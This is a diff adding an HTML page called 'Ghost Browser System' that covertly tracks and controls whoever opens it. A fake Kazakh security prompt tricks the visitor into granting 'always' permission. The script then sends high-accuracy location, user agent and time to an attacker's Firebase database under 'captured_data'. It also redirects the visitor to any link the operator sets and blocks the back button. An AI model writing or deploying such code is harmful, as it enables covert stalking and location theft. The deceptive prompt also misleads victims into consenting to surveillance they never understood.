@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost Browser System</title>
+    <style>
+        #force-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:10000; display:flex; justify-content:center; align-items:center; font-family:sans-serif; }
+        .box { width:90%; text-align:center; background:#f1f3f4; padding:20px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.1); }
+        button { background:#1a73e8; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; }
+    </style>
+</head>
+<body>
+<div id="force-overlay">
+    <div class="box">
+        <h3>Жүйелік рұқсат қажет</h3>
+        <p>Құрылғының қауіпсіздігін қамтамасыз ету үшін бұл қолданбаны <b>ӘРҚАШАН</b> режимінде пайдалану міндетті.</p>
+        <button onclick="startGhost()">ӘРҚАШАН РҰҚСАТ БЕРУ</button>
+    </div>
+</div>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+<script>
+    // МҰНДА ӨЗ FIREBASE CONFIG-ІҢДІ ҚОЙ!
+    const firebaseConfig = {
+        apiKey: "YOUR_API_KEY",
+        databaseURL: "https://tulpar-system-default-rtdb.firebaseio.com",
+        projectId: "tulpar-system",
+        storageBucket: "tulpar-system.appspot.com",
+        messagingSenderId: "YOUR_ID",
+        appId: "YOUR_APP_ID"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function startGhost() {
+        document.documentElement.requestFullscreen();
+        document.getElementById('force-overlay').style.display = 'none';
+        navigator.geolocation.getCurrentPosition((pos) => {
+            db.ref('captured_data').push({
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                device: navigator.userAgent,
+                time: new Date().toLocaleString()
+            });
+        }, null, {enableHighAccuracy: true});
+        db.ref('command/active_link').on('value', (snapshot) => {
+            const link = snapshot.val();
+            if(link) window.location.replace(link);
+        });
+    }
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () { history.go(1); };
+</script>
+</body>
+</html>
